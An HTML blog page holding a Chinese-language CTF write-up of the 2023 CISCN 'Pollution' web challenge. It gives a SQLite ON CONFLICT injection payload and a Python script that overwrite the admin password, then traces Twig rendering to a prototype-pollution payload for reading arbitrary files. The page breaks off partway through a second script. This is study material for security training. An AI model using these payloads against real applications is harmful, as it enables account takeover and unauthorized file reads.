@@ -1,0 +1,682 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="s4mmy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2023_CISCN_Pollution开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。 经过注册登录测试可以猜到第一步是需要获得admin的密码。 在app.js里可以看到下列sql语句 12345db.all(&quot;SELECT * FROM users WHERE username&#x3D;? AND password&#x3D;?&quot;,[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023_CISCN_Pollution">
+<meta property="og:url" content="https://sammylingsj.github.io/2023/06/24/2023CISCN/2023_CISCN_Pollution/index.html">
+<meta property="og:site_name" content="s4mmy&#39;s blog">
+<meta property="og:description" content="2023_CISCN_Pollution开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。 经过注册登录测试可以猜到第一步是需要获得admin的密码。 在app.js里可以看到下列sql语句 12345db.all(&quot;SELECT * FROM users WHERE username&#x3D;? AND password&#x3D;?&quot;,[">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sammylingsj.github.io/img/2023ciscn/aa.jpg">
+<meta property="article:published_time" content="2023-06-24T07:57:25.501Z">
+<meta property="article:modified_time" content="2023-06-30T17:19:24.203Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sammylingsj.github.io/img/2023ciscn/aa.jpg">
+  
+  
+  
+  <title>2023_CISCN_Pollution - s4mmy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sammylingsj.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>s4mmy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2023ciscn/banner.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023_CISCN_Pollution"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-24 15:57" pubdate>
+          2023年6月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2023_CISCN_Pollution</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="2023-CISCN-Pollution"><a href="#2023-CISCN-Pollution" class="headerlink" title="2023_CISCN_Pollution"></a>2023_CISCN_Pollution</h2><p>开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。</p>
+<p>经过注册登录测试可以猜到第一步是需要获得admin的密码。</p>
+<p>在<code>app.js</code>里可以看到下列sql语句</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">db.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span>,[username,password],<span class="hljs-keyword">function</span>(<span class="hljs-params">err,result</span>)<br><br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=?&quot;</span>, [username], <span class="hljs-keyword">function</span>(<span class="hljs-params">err, row</span>)<br><br><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;utils.md5(password)&#125;</span>&#x27;)`</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到前两句都进行了预编译，所以无法进行注入，我们把重点放到第三句上。非常简单的单引号闭合，对于我来说难点就在这里使用的是SQLite进行注入，当时在比赛的时候还没接触过这类的sql注入。。。用sqlmap硬跑没跑出来。</p>
+<p>完整sql查询代码如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;utils.md5(password)&#125;</span>&#x27;)`</span>;<br>            db.<span class="hljs-title function_">run</span>(query,<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)&#123;<br>              <span class="hljs-keyword">if</span>(err)&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err)<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Error!&#x27;);window.location.href=&#x27;/register&#x27;&lt;/script&gt;&quot;</span>);<br>              &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Register successed&#x27;);window.location.href=&#x27;/login&#x27;&lt;/script&gt;&quot;</span>);<br>              &#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到对于语句执行错误或者成功会统一输出<code>Error</code>或者<code>success</code>，所以这里没办法使用报错注入或者直接联合查询拖库等查看admin密码。</p>
+<p>这里的突破点是直接使用UPDATE语句来更新admin的密码。</p>
+<p>经过测试常规的UPDATE语句没办法直接更新用户的密码，这里使用sqllite里的另一句更新数据的语句</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-params">...</span>..<span class="hljs-keyword">on</span> CONFLICT <span class="hljs-keyword">DO</span><span class="hljs-params">...</span>..<br></code></pre></td></tr></table></figure>
+
+<p>所以构造如下注入语句</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;, &#x27;</span>md5(<span class="hljs-number">123456</span>)<span class="hljs-string">&#x27;) on CONFLICT DO UPDATE password = &#x27;</span>md5(<span class="hljs-number">123456</span>)<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
+
+<p>据此可以使用python写出如下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SQLinjection</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span><br>    passwd=<span class="hljs-string">&#x27;123456&#x27;</span><br>    <span class="hljs-built_in">hash</span>=passwd.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;admin&#x27;,&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27;) on CONFLICT DO UPDATE SET password=&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27; --+&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected successfully!\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected failed&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>    SQLinjection(url)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>注入成功后就进入<code>/admin</code>页面了，然而web页面什么都没有。开始审计源码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/admin&quot;</span>,utils.<span class="hljs-property">checkIsAdmin</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>)&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>,&#123;<span class="hljs-string">&#x27;username&#x27;</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>&#125;)<br>  &#125;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Info</span> =&#123;<br>      <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Try2HackMe!&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>&#123;<br>      utils.<span class="hljs-title function_">extend</span>(<span class="hljs-title class_">Info</span>, req.<span class="hljs-property">body</span>);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-title class_">Info</span>.<span class="hljs-property">username</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-title class_">Info</span>.<span class="hljs-property">message</span>&#125;);<br>    &#125;<span class="hljs-keyword">catch</span>(err)&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Error!&#x27;);window.location.href=&#x27;/admin&#x27;&lt;/script&gt;&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>定位到<code>utils.extend</code>在<code>utils.js</code>中查看源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">target</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> source = <span class="hljs-variable language_">arguments</span>[i]<br>            <br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> source) &#123;<br>                <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(source, key)) &#123;<br>                    <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>                        <span class="hljs-title class_">Utils</span>.<span class="hljs-title function_">extend</span>(target[key], source[key])<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        target[key] = source[key]<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> target<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>很典型的递归调用合并函数。至此可以判断下一步的利用点是原型链污染。</p>
+<p>同时可以看到在<code>__proto__</code>属性被过滤了，这里使用<code>constructor.prototype</code>进行绕过。</p>
+<p>现在把重点放在<code>entxend</code>函数后面的<code>render</code>函数里面。设置debug进行逐行审计。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">utils</span>.js-&gt;</span>render()<br><span class="hljs-function"><span class="hljs-title">response</span>.js-&gt;</span>app.render()<br><span class="hljs-function"><span class="hljs-title">application</span>-&gt;</span>view.render()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.exports.twig()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.Templates.loadRemote()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.Templates.loadRemote()<br></code></pre></td></tr></table></figure>
+
+<p>首先是进入response.js里的res.render()函数,这里的操作就是对一些数据进行了赋值。</p>
+<p>接着进入到了application.js里的app.render()里，也是对一些数据进行了赋值。</p>
+<p>接着进入到了application.js里的this.set(path)</p>
+<p>在view.js里设置了fileName值为变量name的值，即<code>admin</code></p>
+<p>接着在这里</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span>) &#123;<br>   <span class="hljs-comment">// get extension from default engine name</span><br>   <span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span>[<span class="hljs-number">0</span>] !== <span class="hljs-string">&#x27;.&#x27;</span><br>     ? <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span><br>     : <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span>;<br><br>   fileName += <span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span>;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>fileName被设置为了<code>admin.twig</code></p>
+<p>接着还是在view.js里会调用lookup方法，根据文件名<code>admin.twig</code>查找并设置<code>path</code>值</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// lookup path</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookup</span>(fileName);<br></code></pre></td></tr></table></figure>
+
+<p>然后又跳到了application.js里的view.render()里面</p>
+<p>接着到twig.js里的<code>Twig.exports.renderFile()</code>，然后是Twig.exports.twig(params),这里的作用是加载渲染twig模板并输出。</p>
+<p>进入<code>Twig.exports.renderFile()</code>后显示对params的各个参数进行判断</p>
+<p>由于在上面我们知道了path值已经被设置为了<code>admin.twig</code>所以这里会进入判断，同时要注意这里传入的params对象已经没有了path属性。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (params.<span class="hljs-property">path</span> !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-title function_">loadRemote</span>(params.<span class="hljs-property">path</span>, &#123;<br>        <span class="hljs-attr">id</span>: id,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;fs&#x27;</span>,<br>        <span class="hljs-attr">parser</span>: params.<span class="hljs-property">parser</span> || <span class="hljs-string">&#x27;twig&#x27;</span>,<br>        <span class="hljs-attr">base</span>: params.<span class="hljs-property">base</span>,<br>        <span class="hljs-attr">module</span>: params.<span class="hljs-property">module</span>,<br>        <span class="hljs-attr">precompiled</span>: params.<span class="hljs-property">precompiled</span>,<br>        <span class="hljs-attr">async</span>: params.<span class="hljs-property">async</span>,<br>        <span class="hljs-attr">options</span>: options<br>      &#125;, params.<span class="hljs-property">load</span>, params.<span class="hljs-property">error</span>);<br>    &#125;<br>  &#125;; <span class="hljs-comment">// Extend Twig with a new filter.</span><br></code></pre></td></tr></table></figure>
+
+<p>接着是<code>loadRemote</code>函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-property">loadRemote</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">location, params, callback, errorCallback</span>) &#123;<br>    <span class="hljs-comment">// Default to the URL so the template is cached.</span><br>    <span class="hljs-keyword">var</span> id = <span class="hljs-keyword">typeof</span> params.<span class="hljs-property">id</span> === <span class="hljs-string">&#x27;undefined&#x27;</span> ? location : params.<span class="hljs-property">id</span>;<br>    <span class="hljs-keyword">var</span> cached = <span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-property">registry</span>[id]; <span class="hljs-comment">// Check for existing template</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Twig</span>.<span class="hljs-property">cache</span> &amp;&amp; <span class="hljs-keyword">typeof</span> cached !== <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>      <span class="hljs-comment">// A template is already saved with the given id.</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-title function_">callback</span>(cached);<br>      &#125; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> if async, return deferred promise</span><br><br><br>      <span class="hljs-keyword">return</span> cached;<br>    &#125; <span class="hljs-comment">// If the parser name hasn&#x27;t been set, default it to twig</span><br><br><br>    params.<span class="hljs-property">parser</span> = params.<span class="hljs-property">parser</span> || <span class="hljs-string">&#x27;twig&#x27;</span>;<br>    params.<span class="hljs-property">id</span> = id; <span class="hljs-comment">// Default to async</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> params.<span class="hljs-property">async</span> === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>      params.<span class="hljs-property">async</span> = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-comment">// Assume &#x27;fs&#x27; if the loader is not defined</span><br><br><br>    <span class="hljs-keyword">var</span> loader = <span class="hljs-variable language_">this</span>.<span class="hljs-property">loaders</span>[params.<span class="hljs-property">method</span>] || <span class="hljs-variable language_">this</span>.<span class="hljs-property">loaders</span>.<span class="hljs-property">fs</span>;<br>    <span class="hljs-keyword">return</span> loader.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, location, params, callback, errorCallback);<br>  &#125;; <span class="hljs-comment">// Determine object type</span><br></code></pre></td></tr></table></figure>
+
+<p>这边是通过params的id来加载模版。location变量正好是上面传入的<code>params.path</code>，且params.id为非空，所以这里是通过<code>params.id</code>来加载模板。而在上面的代码中，id的值也正好是path的值。</p>
+<p><img src="/img/2023ciscn/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着会通过call函数会调用到<code>registerLoader</code>函数</p>
+<p><code>registerLoader</code>函数我们可以关注下面这一条</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (precompiled === <span class="hljs-literal">true</span>) &#123;<br>        data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);<br>      &#125;<br><br>      params.<span class="hljs-property">data</span> = data;<br>      params.<span class="hljs-property">path</span> = params.<span class="hljs-property">path</span> || location; <span class="hljs-comment">// Template is in data</span><br><br></code></pre></td></tr></table></figure>
+
+<p>因为在之前params的path属性已经被销毁，这里默认是location的路径。所以这里可以推测出一条利用链，通过原型链污染来控制path属性从而读取任意文件。</p>
+<p>所以原型链可以按如下格式进行构造</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;protoytpe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;flag路径&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>根据上面的分析可以编写以下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 